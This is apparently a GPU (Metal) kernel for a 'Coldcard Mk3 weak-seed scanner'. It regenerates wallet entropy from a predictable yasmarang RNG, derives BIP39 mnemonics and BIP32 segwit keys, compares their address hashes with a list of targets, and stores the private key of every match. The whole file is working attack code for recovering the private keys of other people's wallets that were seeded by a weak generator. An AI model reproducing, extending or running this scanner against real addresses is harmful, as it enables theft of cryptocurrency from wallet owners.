// Coldcard Mk3 weak-seed scanner. One thread = one (pad, skip) candidate.
// Chain: yasmarang raw -> SHA256 -> BIP39 mnemonic -> PBKDF2-HMAC-SHA512
//        -> BIP32 m/84'/0'/0'/0/idx -> hash160(compressed pubkey) -> match.
#include <metal_atomic>
#include "rng.h"
#include "sha512.h"
#include "hash160.h"
#include "secp256k1.h"

using namespace metal;

struct Params {
    ulong padStart;    // first pad covered by this dispatch
    uint  skipMax;     // skip values per pad
    uint  idxMax;      // address indices per account
    uint  targetCount;
    uint  rtcTR;       // RTC TR hypothesis (69 = frozen/universal)
    uint  rtcSSR;      // RTC SSR hypothesis (233 = frozen/universal)
};

struct Hit {
    uint  pad;
    uint  skip;
    uint  idx;
    uchar priv[32];
    uchar h160[20];
};

// secp256k1 n, big-endian bytes
constant uchar NB[32] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,
    0xBA,0xAE,0xDC,0xE6,0xAF,0x48,0xA0,0x3B,
    0xBF,0xD2,0x5E,0x8C,0xD0,0x36,0x41,0x41
};

// k = (k + il) mod n, both 32-byte big-endian
inline void scalarAddModN(thread uchar k[32], thread const uchar il[32]) {
    ulong carry = 0;
    for (int i = 31; i >= 0; i--) {
        ulong t = ulong(k[i]) + ulong(il[i]) + carry;
        k[i] = uchar(t & 0xFF);
        carry = t >> 8;
    }
    bool ge = carry != 0;
    if (!ge) {
        ge = true;
        for (int i = 0; i < 32; i++) {
            if (k[i] > NB[i]) break;
            if (k[i] < NB[i]) { ge = false; break; }
        }
    }
    if (ge) {
        ulong borrow = 0;
        for (int i = 31; i >= 0; i--) {
            ulong d = ulong(k[i]) - ulong(NB[i]) - borrow;
            k[i] = uchar(d & 0xFF);
            borrow = (d >> 63) & 1;
        }
    }
}

// entropy(32) -> 24-word sentence. words8 = 2048 slots x 8 bytes, zero-padded.
inline void entropyToSentence(thread const uchar ent[32],
                              device const uchar* words8,
                              thread uchar* out, thread uint& outLen) {
    uchar csh[32];
    sha256once(ent, 32, csh);
    outLen = 0;
    for (int w = 0; w < 24; w++) {
        uint idx = 0;
        for (int b = 0; b < 11; b++) {
            uint bp = uint(w) * 11 + uint(b);
            uint bit;
            if (bp < 256) bit = (ent[bp >> 3] >> (7 - (bp & 7))) & 1u;
            else          bit = (csh[0] >> (7 - (bp - 256))) & 1u;
            idx = (idx << 1) | bit;
        }
        if (w) out[outLen++] = ' ';
        device const uchar* wp = words8 + idx * 8;
        for (int i = 0; i < 8 && wp[i]; i++) out[outLen++] = wp[i];
    }
}

// ---- BIP32 ----
struct EKey { uchar key[32]; uchar cc[32]; };

inline EKey masterFromSeed(thread const uchar seed[64]) {
    uchar I[64];
    uchar ks[12] = {'B','i','t','c','o','i','n',' ','s','e','e','d'};
    hmacSha512(ks, 12, seed, 64, I);
    EKey k;
    for (int i = 0; i < 32; i++) { k.key[i] = I[i]; k.cc[i] = I[32 + i]; }
    return k;
}

// CKDpriv. hardened: HMAC(cc, 0x00||key||idxBE); else HMAC(cc, pub||idxBE).
inline EKey ckdPriv(thread const EKey& par, uint index, device const Pt* gtab) {
    uchar data[37];
    uint dlen;
    if (index & 0x80000000u) {
        data[0] = 0;
        for (int i = 0; i < 32; i++) data[1 + i] = par.key[i];
        dlen = 33;
    } else {
        Pt p; mulGTable(p, par.key, gtab);
        ptSerialize(p, data);
        dlen = 33;
    }
    for (int i = 0; i < 4; i++) data[dlen + i] = uchar(index >> (24 - 8 * i));
    dlen += 4;
    uchar I[64];
    hmacSha512(par.cc, 32, data, dlen, I);
    EKey c;
    for (int i = 0; i < 32; i++) { c.key[i] = par.key[i]; c.cc[i] = I[32 + i]; }
    uchar il[32];
    for (int i = 0; i < 32; i++) il[i] = I[i];
    scalarAddModN(c.key, il);
    return c;
}

// One-time setup: table[j] = 2^j * G in affine form (thread 0 only).
kernel void setupG(device Pt* table [[buffer(0)]],
                   uint gid [[thread_position_in_grid]]) {
    if (gid != 0) return;
    Pt g = gPoint();
    for (int j = 0; j < 256; j++) {
        Pt a = g;
        if (j > 0) {
            // convert to affine before storing
            Fe zinv, z2;
            feInv(zinv, a.z);
            feSqr(z2, zinv);
            feMul(a.x, a.x, z2);
            feMul(a.y, a.y, z2);
            feMul(a.y, a.y, zinv);
            for (int i = 0; i < 8; i++) { a.z.l[i] = 0; }
            a.z.l[0] = 1;
        }
        table[j] = a;
        ptDbl(g);
    }
}

// binary search 20-byte target in sorted flat array
inline bool targetHit(device const uchar* targets, uint count, thread const uchar h[20]) {
    uint lo = 0, hi = count;
    while (lo < hi) {
        uint mid = (lo + hi) >> 1;
        device const uchar* t = targets + mid * 20;
        int cmp = 0;
        for (int i = 0; i < 20; i++) {
            if (h[i] < t[i]) { cmp = -1; break; }
            if (h[i] > t[i]) { cmp = 1; break; }
        }
        if (cmp == 0) return true;
        if (cmp < 0) hi = mid; else lo = mid + 1;
    }
    return false;
}

// One thread = one (pad, skip) candidate. gid = padOffset*skipMax + skip.
kernel void scanKernel(device const uchar* targets [[buffer(0)]],
                       device const uchar* words8  [[buffer(1)]],
                       device Hit*         hits    [[buffer(2)]],
                       device atomic_uint* hitCnt  [[buffer(3)]],
                       constant Params&    P       [[buffer(4)]],
                       device const Pt*    gtab    [[buffer(5)]],
                       uint gid [[thread_position_in_grid]]) {
    uint pad  = uint(P.padStart) + gid / P.skipMax;
    uint skip = gid % P.skipMax;

    thread unsigned raw[8];
    if (!rngRawHP(pad, P.rtcTR, P.rtcSSR, int(skip), raw)) return;

    // LE word bytes -> SHA256 = wallet entropy (mirrors Go seedEntropy)
    uchar rawB[32];
    for (int i = 0; i < 8; i++) {
        rawB[i*4+0] = uchar(raw[i]);
        rawB[i*4+1] = uchar(raw[i] >> 8);
        rawB[i*4+2] = uchar(raw[i] >> 16);
        rawB[i*4+3] = uchar(raw[i] >> 24);
    }
    uchar ent[32];
    sha256once(rawB, 32, ent);

    uchar sentence[256]; uint slen;
    entropyToSentence(ent, words8, sentence, slen);

    uchar seed[64];
    pbkdf2Bip39(sentence, slen, seed);

    EKey acct = ckdPriv(ckdPriv(ckdPriv(masterFromSeed(seed), 84u|0x80000000u, gtab), 0u|0x80000000u, gtab), 0u|0x80000000u, gtab);
    EKey ext  = ckdPriv(acct, 0u, gtab);

    for (uint idx = 0; idx < P.idxMax; idx++) {
        EKey leaf = ckdPriv(ext, idx, gtab);
        Pt pub; mulGTable(pub, leaf.key, gtab);
        uchar ser[33]; ptSerialize(pub, ser);
        uchar h[20]; hash160(ser, 33, h);
        if (targetHit(targets, P.targetCount, h)) {
            uint slot = atomic_fetch_add_explicit(hitCnt, 1u, memory_order_relaxed);
            if (slot < 1024u) {
                hits[slot].pad = pad;
                hits[slot].skip = skip;
                hits[slot].idx = idx;
                for (int i = 0; i < 32; i++) hits[slot].priv[i] = leaf.key[i];
                for (int i = 0; i < 20; i++) hits[slot].h160[i] = h[i];
            }
        }
    }
}
